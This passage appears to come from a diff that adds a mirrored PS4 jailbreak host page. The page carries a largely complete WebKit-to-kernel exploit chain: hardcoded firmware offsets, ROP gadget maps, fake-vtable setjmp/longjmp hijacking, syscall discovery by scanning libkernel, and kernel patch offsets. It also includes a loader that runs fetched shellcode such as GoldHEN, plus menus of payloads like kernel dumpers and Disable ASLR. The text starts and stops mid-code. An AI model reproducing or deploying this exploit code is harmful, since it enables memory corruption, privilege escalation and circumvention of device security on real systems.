+   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+   tmp.set(new Uint8Array(req.response), 0);
+   tmp.set(padding, req.response.byteLength);
+   var shellcode = new Uint32Array(tmp.buffer);
+   pl.set(shellcode,0);
+   var pthread = p.malloc(0x10);
+   chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
+   allset();
+  }
+ };
+}
+
+//ESP8266 usb functions - stooged
+function disableUSB() {
+  var getpl = new XMLHttpRequest();
+  getpl.open("POST.html", "./usboff", true);
+  getpl.send(null);
+}
+
+
+function enableUSB() {
+  var getpl = new XMLHttpRequest();
+  getpl.open("POST.html", "./usbon", true);
+  getpl.send(null);
+}
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function jbdone() {
+progress.innerHTML="PS4Xploit - Loading GoldHEN...";
+goldhen222();
+}
+
+function allset() {
+progress.innerHTML="PS4Xploit";
+}
+	
+function goldhen222(){
+    PLfile = "payloads/pl_goldhen222.bin";
+    load_poc();
+}
+
+</script>
+<html>
+    
+<!-- Mirrored from 10.1.1.1/Hakkuraifu.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 13 Nov 2022 17:25:07 GMT -->
+<head>
+        <title>Hakkuraifu | PS4Xploit</title>
+
+        <link rel="shortcut icon" type="image/png" href="Nazky/Icon.ico"/>
+        <link rel="stylesheet" href="Nazky/font-awesome.min.css">
+        <link rel="stylesheet" href="Nazky/raleway.css">
+        <link rel="stylesheet" href="Nazky/simple-notify.min.css" />
+        <script src="Nazky/simple-notify.min.js"></script>
+        <script src="Nazky/jquery-3.6.0.js"></script>
+
+    </head>
+
+    <script>
+        var fw = navigator.userAgent;
+        var fwFromUA = navigator.userAgent.substring(navigator.userAgent.indexOf('5.0 (') + 19, navigator.userAgent.indexOf(') Apple'));
+        fwFromUA = fwFromUA.replace('.', '');
+
+        function outputUpdate(vol) {
+            document.querySelector('#weight').value = vol;
+        }
+    </script>
+
+    <div><img id="BG" class="BG"></div>
+    
+    <body onload="ConsoleCheck()">
+
+        <div id="snowflakeContainer">
+            <span class="snowflake"></span>
+        </div>
+
+        <div class="Title" id="PSTitle">
+            <br>
+            <h1 id="progress">PS4Xploit</h1>
+            <div class="BC" id="ButtonCredit"><a href="#" onclick="unfade('Credit')">Credit</a></div>
+            <div class="BJ" id="ButtonJailbreak" style="display: none;"><a href="Hakkuraifu.html" >Jailbreak Again</a></div>
+        </div>
+        
+        <div class="PC" id="pc" style="display: none;">
+            
+            <div class="topmenu" id="Menu">
+                <a id="PayloadsList" href="#" onclick="unfade('Payloads'),fade('LinuxList'),fade('GamesMods')">Payloads</a>
+                <!--<a id="GM" href="#" onclick="unfade('GamesMods'),fade('LinuxList'),fade('Payloads')">Games Mods</a> ?> -->
+                <a id="LL" href="#" onclick="fade('GamesMods'),fade('Payloads'),unfade('LinuxList')">Linux</a>
+                <a href="javascript:void(0);" class="icon" onclick="Menu()">
+                  <i class="fa fa-bars"></i>
+                </a>
+            </div>
+    <div class="SelectF">
+                <input type="text" placeholder="PS4 IP Here" id="psip">
+
+                <select class="ComboBox" id="cb">
+                    <option>
+                        9.00
+                    </option>
+
+                    <option>
+                        7.55
+                    </option>
+
+                    <option>
+                        7.51
+                    </option>
+
+                    <option>
+                        7.50
+                    </option>
+
+                    <option>
+                        6.72
+                    </option>
+
+                    <option>
+                        5.05
+                    </option>
+                </select>
+            </div>
+            <div class="payloadslist" id="Payloads">
+                <td>
+                    
+                    <table>
+                        <h1>Dumper</h1>
+                        <tr>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_KernelDumper()">Kernel Dumper</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_AppDumper()">App Dumper</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_VTXDumper()">VTX Dumper</a></div>
+                        </tr>
+                    </table>
+
+                    <table>
+                        <h1>Tools</h1>
+                        <tr>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Orbis()">OrbisTool Box</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_PS4Debug()">PS4Debug</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_WebrRTE()">WebRTE</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_ToDex()">ToDex</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_FTP()">FTP</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_App2USB()">App2USB</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_DisableASLR()">Disable ASLR</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_ExitIDU()">ExitIDU</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_RIFRenamer()">RIF Renamer</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_HistoryBlocker()">History Blocker</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_DisableUpdates()">Disable Updates</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_EnableUpdates()">Enable Updates</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_BackupDB()">Backup DB</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_RestoreDB()">Restore DB</a></div>
+                            <!--<div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="windows.location(`./Bins/Web-Activator/`)">Wabe-Activator</a></div>-->
+                        </tr>
+                    </table>
+
+                </td>
+                
+            </div>
+
+            <div class="payloadslist" id="GamesMods" style="display: none;">
+                <td>
+                    
+                    <table>
+                        <h1>GTA V</h1>
+                        <tr>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_GTAArbic()">ArbicGuy (1.00)</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_GTAArbic3()">ArbicGuy (1.32)</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_GTAArbic33()">ArbicGuy (1.33)</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_GTAWM()">WildeModz (1.38)</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_GTABQ()">BeefQueefMod (1.38)</a></div>
+                        </tr>
+                    </table>
+
+                    <table>
+                        <h1>RDR 2</h1>
+                        <tr>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Oysters100()">Oysters (1.00)</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Oysters113()">Oysters (1.13)</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Oysters119()">Oysters (1.19)</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Oysters124()">Oysters (1.24)</a></div>
+                        </tr>
+                    </table>
+                </td>
+                
+            </div>
+
+            
+            <div class="payloadslist" id="LinuxList" style="display: none;">
+                <td>
+                    
+                    <table>
+                        <h1>1080p</h1>
+                        <tr>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Linux()">Linux 1GB</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Linux2gb()">Linux 2GB</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Linux3gb()">Linux 3GB</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Linux4gb()">Linux 4GB</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Linux5gb()">Linux 5GB</a></div>
+                        </tr>
+                    </table>
+
+                    <table>
+                        <h1>720p</h1>
+                        <tr>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Linux_720p()">Linux 1GB</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Linux2gb_720p()">Linux 2GB</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Linux3gb_720p()">Linux 3GB</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Linux4gb_720p()">Linux 4GB</a></div>
+                            <div class="button" id="button-Payload"><div id="circle"></div><a href="#" onclick="load_Linux5gb_720p()">Linux 5GB</a></div>
+                        </tr>
+                    </table>
+                </td>
+                
+            </div>
+
+            <div class="Credit" id="Credit" style="display: none;">
+                <div class="CloseButton" id="CB">
+                    <a onclick="fade('Credit')" href="#" style="text-decoration-style: none; text-decoration: none; color: white;">X</a>
+                </div>
+                <div class="TitleCredit" id="TC"> Credit </div>
+                <div class="BodyCredit" id="BC">
+                    <a id="Categorie"> Host Coder : </a>
+                    <a id="Name"> Nazky </a>
+                    <a id="Link" target="_blank" href="https://twitter.com/NazkyYT"> (@NazkyYT) </a>
+                    <br/>
+                    <br/>
+                    <a id="Categorie"> Payloads Coder : </a>
+                    <a id="Name"> Al-Azif </a>
+                    <a id="Link" target="_blank" href="https://twitter.com/_AlAzif"> (@_AlAzif) </a>
+                    <a id="Name">, Ctn </a>
+                    <a id="Link" target="_blank" href="https://twitter.com/_ctn123"> (@_ctn123) </a>
+                    <a id="Name">, Karo </a>
+                    <a id="Link" target="_blank" href="https://twitter.com/karo_sharifi"> (@karo_sharifi) </a>
+                    <a id="Name">, rfoodxmodz </a>
+                    <a id="Link" target="_blank" href="https://twitter.com/rfoodxmodz"> (@rfoodxmodz) </a>
+                    <a id="Name">, Kameleon </a>
+                    <a id="Link" target="_blank" href="https://twitter.com/KameleonRe"> (@KameleonRe) </a>
+                    <a id="Name">, Sistro </a>
+                    <a id="Name">, ... </a>
+                    <br/>
+                    <br/>
+                    <a id="Categorie"> Special Thanks : </a>
+                    <a id="Name"> KAZYUA </a>
+                    <a id="Link" target="_blank" href="https://twitter.com/NekitoKazuya"> (@NekitoKazuya) </a>
+                    <a id="Name">, Prb </a>
+                    <a id="Link" target="_blank" href="https://twitter.com/Prb29327239"> (@Prb29327239) </a>
+                    <a id="Name">, sleirsgoevy </a>
+                    <a id="Link" target="_blank" href="https://twitter.com/sleirsgoevy"> (@sleirsgoevy) </a>
+                    <a id="Name">, ChendoChap </a>
+                    <br/>
+                    <br/>
+                    <br/>
+                    <br/>
+                    <br/>
+                    <br/>
+                    <br/>
+                    <br/>
+                    <a id="Categorie"> And thanks to all others Hosts/Payloads/Softwares/Exploits maker ! </a>
+                </div>
+            </div>
+        </div>
+
+        <div class="PS4" id="ps4" style="display: none;">
+
+            <div class="bjb" id="ButtonJB">
+               <div id="Jailbreak" ><a style="text-decoration: none; color: rgb(212, 212, 212)" href="#" onclick="start();">Jailbreak</a></div>
+            </div>
+
+            <div class="BP" id="ButtonPayload"><a href="Hakkuraifu86c0.html?J=P">Payload Page</a></div>
+
+<script>
+const OFFSET_wk_vtable_first_element = 0x104F110;
+const OFFSET_WK_memset_import = 0x000002A8;
+const OFFSET_WK___stack_chk_fail_import = 0x00000178;
+const OFFSET_WK_psl_builtin_import = 0xD68;
+const OFFSET_WKR_psl_builtin = 0x33BA0;
+const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
+const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
+const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
+const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;
+const OFFSET_libcint_memset = 0x0004F810;
+const OFFSET_libcint_setjmp = 0x000BB5BC;
+const OFFSET_libcint_longjmp = 0x000BB616;
+const OFFSET_WK2_TLS_IMAGE = 0x38e8020;
+const OFFSET_lk___stack_chk_fail = 0x0001FF60;
+const OFFSET_lk_pthread_create = 0x00025510;
+const OFFSET_lk_pthread_join = 0x0000AFA0;
+var chain;
+var kchain;
+var kchain2;
+var SAVED_KERNEL_STACK_PTR;
+var KERNEL_BASE_PTR;
+var webKitBase;
+var webKitRequirementBase;
+var libSceLibcInternalBase;
+var libKernelBase;
+var textArea = document.createElement("textarea");
+var nogc = [];
+var syscalls = {};
+var gadgets = {};
+var wk_gadgetmap = {"ret": 0x32,"pop rdi": 0x319690,"pop rsi": 0x1F4D6,"pop rdx": 0x986C,"pop rcx": 0x657B7,"pop r8": 0xAFAA71,"pop r9": 0x422571,"pop rax": 0x51A12,"pop rsp": 0x4E293,"mov [rdi], rsi": 0x1A97920,"mov [rdi], rax": 0x10788F7,"mov [rdi], eax": 0x9964BC,"cli ; pop rax": 0x566F8,"sti": 0x1FBBCC,"mov rax, [rax]": 0x241CC,"mov rax, [rsi]": 0x5106A0,"mov [rax], rsi": 0x1EFD890,"mov [rax], rdx": 0x1426A82,"mov [rax], edx": 0x3B7FE4,"add rax, rsi": 0x170397E,"mov rdx, rax": 0x53F501,"add rax, rcx": 0x2FBCD,"mov rsp, rdi": 0x2048062,"mov rdi, [rax + 8] ; call [rax]": 0x751EE7,"infloop": 0x7DFF,"mov [rax], cl": 0xC6EAF};
+var wkr_gadgetmap = {"xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0};
+var wk2_gadgetmap = {"mov [rax], rdi": 0xFFDD7,"mov [rax], rcx": 0x2C9ECA,"mov [rax], cx": 0x15A7D52};
+var hmd_gadgetmap = {"add [r8], r12": 0x2BCE1};
+var ipmi_gadgetmap = {"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B};
+
+function run_hax() {
+    userland();
+    if (chain.syscall(23, 0).low != 0x0) {
+        kernel();
+    }
+	else
+        {
+    jbdone();
+	}
+}
+
+function int64(low, hi) {
+ this.low = (low >>> 0);
+ this.hi = (hi >>> 0);
+ this.add32inplace = function (val) {
+  var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
+  var new_hi = (this.hi >>> 0);
+  if (new_lo < this.low) {
+   new_hi++;
+  }
+  this.hi = new_hi;
+  this.low = new_lo;
+ };
+ this.add32 = function (val) {
+  var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
+  var new_hi = (this.hi >>> 0);
+  if (new_lo < this.low) {
+   new_hi++;
+  }
+  return new int64(new_lo, new_hi);
+ };
+ this.sub32 = function (val) {
+  var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
+  var new_hi = (this.hi >>> 0);
+  if (new_lo > (this.low) & 0xFFFFFFFF) {
+   new_hi--;
+  }
+  return new int64(new_lo, new_hi);
+ };
+ this.sub32inplace = function (val) {
+  var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
+  var new_hi = (this.hi >>> 0);
+  if (new_lo > (this.low) & 0xFFFFFFFF) {
+   new_hi--;
+  }
+  this.hi = new_hi;
+  this.low = new_lo;
+ };
+ this.and32 = function (val) {
+  var new_lo = this.low & val;
+  var new_hi = this.hi;
+  return new int64(new_lo, new_hi);
+ };
+ this.and64 = function (vallo, valhi) {
+  var new_lo = this.low & vallo;
+  var new_hi = this.hi & valhi;
+  return new int64(new_lo, new_hi);
+ };
+ function zeroFill(number, width) {
+  width -= number.toString().length;
+  if (width > 0) {
+   return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
+  }
+  return number + "";
+ }
+ this.toString = function (val) {
+  val = 16;
+  var lo_str = (this.low >>> 0).toString(val);
+  var hi_str = (this.hi >>> 0).toString(val);
+  if (this.hi == 0)
+   return lo_str;
+  else
+   lo_str = zeroFill(lo_str, 8);
+  return hi_str + lo_str;
+ };
+ return this;
+}
+
+window.rop = function () {
+ const stack_sz = 0x40000;
+ const reserve_upper_stack = 0x10000;
+ const stack_reserved_idx = reserve_upper_stack / 4;
+ this.stackback = p.malloc32(stack_sz / 4 + 0x8);
+ this.stack = this.stackback.add32(reserve_upper_stack);
+ this.stack_array = this.stackback.backing;
+ this.retval = this.stackback.add32(stack_sz);
+ this.count = 1;
+ this.branches_count = 0;
+ this.branches_rsps = p.malloc(0x200);
+ this.clear = function () {
+  this.count = 1;
+  this.branches_count = 0;
+  for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
+   this.stack_array[i + stack_reserved_idx] = 0;
+  }
+ };
+ this.pushSymbolic = function () {
+  this.count++;
+  return this.count - 1;
+ };
+ this.finalizeSymbolic = function (idx, val) {
+  if (val instanceof int64) {
+   this.stack_array[stack_reserved_idx + idx * 2] = val.low;
+   this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
+  } else {
+   this.stack_array[stack_reserved_idx + idx * 2] = val;
+   this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
+  }
+ };
+ this.push = function (val) {
+  this.finalizeSymbolic(this.pushSymbolic(), val);
+ };
+ this.push_write8 = function (where, what) {
+  this.push(gadgets["pop rdi"]);
+  this.push(where);
+  this.push(gadgets["pop rsi"]);
+  this.push(what);
+  this.push(gadgets["mov [rdi], rsi"]);
+ };
+ this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
+  if (rdi != undefined) {
+   this.push(gadgets["pop rdi"]);
+   this.push(rdi);
+  }
+  if (rsi != undefined) {
+   this.push(gadgets["pop rsi"]);
+   this.push(rsi);
+  }
+  if (rdx != undefined) {
+   this.push(gadgets["pop rdx"]);
+   this.push(rdx);
+  }
+  if (rcx != undefined) {
+   this.push(gadgets["pop rcx"]);
+   this.push(rcx);
+  }
+  if (r8 != undefined) {
+   this.push(gadgets["pop r8"]);
+   this.push(r8);
+  }
+  if (r9 != undefined) {
+   this.push(gadgets["pop r9"]);
+   this.push(r9);
+  }
+  if (this.stack.add32(this.count * 0x8).low & 0x8) {
+   this.push(gadgets["ret"]);
+  }
+  this.push(rip);
+  return this;
+ };
+ this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
+  this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
+  this.write_result(this.retval);
+  this.run();
+  return p.read8(this.retval);
+ };
+ this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
+  return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+ };
+ this.get_rsp = function () {
+  return this.stack.add32(this.count * 8);
+ };
+ this.write_result = function (where) {
+  this.push(gadgets["pop rdi"]);
+  this.push(where);
+  this.push(gadgets["mov [rdi], rax"]);
+ };
+ this.write_result4 = function (where) {
+  this.push(gadgets["pop rdi"]);
+  this.push(where);
+  this.push(gadgets["mov [rdi], eax"]);
+ };
+ this.jmp_rsp = function (rsp) {
+  this.push(window.gadgets["pop rsp"]);
+  this.push(rsp);
+ };
+ this.run = function () {
+  p.launch_chain(this);
+  this.clear();
+ };
+ this.KERNEL_BASE_PTR_VAR;
+ this.set_kernel_var = function (arg) {
+  this.KERNEL_BASE_PTR_VAR = arg;
+ };
+ this.rax_kernel = function (offset) {
+  this.push(gadgets["pop rax"]);
+  this.push(this.KERNEL_BASE_PTR_VAR);
+  this.push(gadgets["mov rax, [rax]"]);
+  this.push(gadgets["pop rsi"]);
+  this.push(offset);
+  this.push(gadgets["add rax, rsi"]);
+ };
+ this.write_kernel_addr_to_chain_later = function (offset) {
+  this.push(gadgets["pop rdi"]);
+  var idx = this.pushSymbolic();
+  this.rax_kernel(offset);
+  this.push(gadgets["mov [rdi], rax"]);
+  return idx;
+ };
+ this.kwrite8 = function (offset, qword) {
+  this.rax_kernel(offset);
+  this.push(gadgets["pop rsi"]);
+  this.push(qword);
+  this.push(gadgets["mov [rax], rsi"]);
+ };
+ this.kwrite4 = function (offset, dword) {
+  this.rax_kernel(offset);
+  this.push(gadgets["pop rdx"]);
+  this.push(dword);
+  this.push(gadgets["mov [rax], edx"]);
+ };
+ this.kwrite2 = function (offset, word) {
+  this.rax_kernel(offset);
+  this.push(gadgets["pop rcx"]);
+  this.push(word);
+  this.push(gadgets["mov [rax], cx"]);
+ };
+ this.kwrite1 = function (offset, byte) {
+  this.rax_kernel(offset);
+  this.push(gadgets["pop rcx"]);
+  this.push(byte);
+  this.push(gadgets["mov [rax], cl"]);
+ };
+ this.kwrite8_kaddr = function (offset1, offset2) {
+  this.rax_kernel(offset2);
+  this.push(gadgets["mov rdx, rax"]);
+  this.rax_kernel(offset1);
+  this.push(gadgets["mov [rax], rdx"]);
+ };
+ return this;
+};
+
+function userland() {
+ p.launch_chain = launch_chain;
+ p.malloc = malloc;
+ p.malloc32 = malloc32;
+ p.stringify = stringify;
+ p.array_from_address = array_from_address;
+ p.readstr = readstr;
+ var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
+ var textAreaVtable = p.read8(textAreaVtPtr);
+ webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
+ libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
+ libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);
+ libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
+ libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);
+ webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
+ webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);
+ for (var gadget in wk_gadgetmap) {
+  window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
+ }
+ for (var gadget in wkr_gadgetmap) {
+  window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
+ }
+ function get_jmptgt(address) {
+  var instr = p.read4(address) & 0xFFFF;
+  var offset = p.read4(address.add32(2));
+  if (instr != 0x25FF) {
+   return 0;
+  }
+  return address.add32(0x6 + offset);
+ }
+ function malloc(sz) {
+  var backing = new Uint8Array(0x10000 + sz);
+  window.nogc.push(backing);
+  var ptr = p.read8(p.leakval(backing).add32(0x10));
+  ptr.backing = backing;
+  return ptr;
+ }
+ function malloc32(sz) {
+  var backing = new Uint8Array(0x10000 + sz * 4);
+  window.nogc.push(backing);
+  var ptr = p.read8(p.leakval(backing).add32(0x10));
+  ptr.backing = new Uint32Array(backing.buffer);
+  return ptr;
+ }
+ function array_from_address(addr, size) {
+  var og_array = new Uint32Array(0x1000);
+  var og_array_i = p.leakval(og_array).add32(0x10);
+  p.write8(og_array_i, addr);
+  p.write4(og_array_i.add32(0x8), size);
+  p.write4(og_array_i.add32(0xC), 0x1);
+  nogc.push(og_array);
+  return og_array;
+ }
+ function stringify(str) {
+  var bufView = new Uint8Array(str.length + 1);
+  for (var i = 0; i < str.length; i++) {
+   bufView[i] = str.charCodeAt(i) & 0xFF;
+  }
+  window.nogc.push(bufView);
+  return p.read8(p.leakval(bufView).add32(0x10));
+ }
+ function readstr(addr) {
+  var str = "";
+  for (var i = 0; ; i++) {
+   var c = p.read1(addr.add32(i));
+   if (c == 0x0) {
+    break;
+   }
+   str += String.fromCharCode(c);
+  }
+  return str;
+ }
+ var fakeVtable_setjmp = p.malloc32(0x200);
+ var fakeVtable_longjmp = p.malloc32(0x200);
+ var original_context = p.malloc32(0x40);
+ var modified_context = p.malloc32(0x40);
+ p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
+ p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two));
+ p.write8(fakeVtable_setjmp.add32(0x10), original_context);
+ p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
+ p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one));
+ p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
+ p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two));
+ p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
+ p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
+ p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one));
+ function launch_chain(chain) {
+  chain.push(window.gadgets["pop rdi"]);
+  chain.push(original_context);
+  chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
+  p.write8(textAreaVtPtr, fakeVtable_setjmp);
+  textArea.scrollLeft = 0x0;
+  p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
+  p.write8(modified_context.add32(0x10), chain.stack);
+  p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)));
+  p.write8(textAreaVtPtr, fakeVtable_longjmp);
+  textArea.scrollLeft = 0x0;
+  p.write8(textAreaVtPtr, textAreaVtable);
+ }
+ var kview = new Uint8Array(0x1000);
+ var kstr = p.leakval(kview).add32(0x10);
+ var orig_kview_buf = p.read8(kstr);
+ p.write8(kstr, window.libKernelBase);
+ p.write4(kstr.add32(8), 0x40000);
+ var countbytes;
+ for (var i = 0; i < 0x40000; i++) {
+  if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
+   countbytes = i;
+   break;
+  }
+ }
+ p.write4(kstr.add32(8), countbytes + 32);
+ var dview32 = new Uint32Array(1);
+ var dview8 = new Uint8Array(dview32.buffer);
+ for (var i = 0; i < countbytes; i++) {
+  if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
+   dview8[0] = kview[i + 3];
+   dview8[1] = kview[i + 4];
+   dview8[2] = kview[i + 5];
+   dview8[3] = kview[i + 6];
+   var syscallno = dview32[0];
+   window.syscalls[syscallno] = window.libKernelBase.add32(i);
+  }
+ }
+ p.write8(kstr, orig_kview_buf);
+ chain = new rop();
+ if (chain.syscall(20).low == 0) {
+  alert("Webkit Exploit Failed. Try Again.");
+  while (1);
+ }
+}
+
+function kernel() {
+ var handle;
+ var random_path;
+ var ex_info;
+
+ function load_prx(name) {
+  var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
+  if (res.low != 0x0) {
+   alert("failed to load prx/get handle " + name);
+  }
+  p.write8(ex_info, 0x1A8);
+  res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
+  if (res.low != 0x0) {
+   alert("failed to get module info from handle");
+  }
+  var tlsinit = p.read8(ex_info.add32(0x110));
+  var tlssize = p.read4(ex_info.add32(0x11C));
+  if (tlssize != 0) {
+   if (name == "libSceWebKit2.sprx") {
+    tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
+   } else {
+    alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
+   }
+  };
+  return tlsinit;
+ }
+ 
+ function extra_gadgets() {
+  handle = p.malloc(0x1E8);
+  var randomized_path_length_ptr = handle.add32(0x4);
+  var randomized_path_ptr = handle.add32(0x14);
+  ex_info = randomized_path_ptr.add32(0x40);
+  p.write8(randomized_path_length_ptr, 0x2C);
+  chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
+  random_path = p.readstr(randomized_path_ptr);
+  var ipmi_addr = load_prx("libSceIpmi.sprx");
+  var hmd_addr = load_prx("libSceHmd.sprx");
+  var wk2_addr = load_prx("libSceWebKit2.sprx");
+  for (var gadget in hmd_gadgetmap) {
+   window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
+  }
+  for (var gadget in wk2_gadgetmap) {
+   window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
+  }
+  for (var gadget in ipmi_gadgetmap) {
+   window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
+  }
+  for (var gadget in window.gadgets) {
+   p.read8(window.gadgets[gadget]);
+   chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
+  }
+  chain.run();
+ }
+ 
+ function kchain_setup() {
+  const KERNEL_busy = 0x1B28DF8;
+  const KERNEL_bcopy = 0xACD;
+  const KERNEL_bzero = 0x2713FD;
+  const KERNEL_pagezero = 0x271441;
+  const KERNEL_memcpy = 0x2714BD;
+  const KERNEL_pagecopy = 0x271501;
+  const KERNEL_copyin = 0x2716AD;
+  const KERNEL_copyinstr = 0x271B5D;
+  const KERNEL_copystr = 0x271C2D;
+  const KERNEL_setidt = 0x312c40;
+  const KERNEL_setcr0 = 0x1FB949;
+  const KERNEL_Xill = 0x17d500;
+  const KERNEL_veriPatch = 0x626874;
+  const KERNEL_enable_syscalls_1 = 0x490;
+  const KERNEL_enable_syscalls_2 = 0x4B5;
+  const KERNEL_enable_syscalls_3 = 0x4B9;
+  const KERNEL_enable_syscalls_4 = 0x4C2;
+  const KERNEL_mprotect = 0x80B8D;
+  const KERNEL_prx = 0x23AEC4;
+  const KERNEL_dlsym_1 = 0x23B67F;
+  const KERNEL_dlsym_2 = 0x221b40;
+  const KERNEL_setuid = 0x1A06;
+  const KERNEL_syscall11_1 = 0x1100520;
+  const KERNEL_syscall11_2 = 0x1100528;
+  const KERNEL_syscall11_3 = 0x110054C;
+  const KERNEL_syscall11_gadget = 0x4c7ad;
+  const KERNEL_mmap_1 = 0x16632A;
+  const KERNEL_mmap_2 = 0x16632D;
+  const KERNEL_setcr0_patch = 0x3ade3B;
+  const KERNEL_kqueue_close_epi = 0x398991;
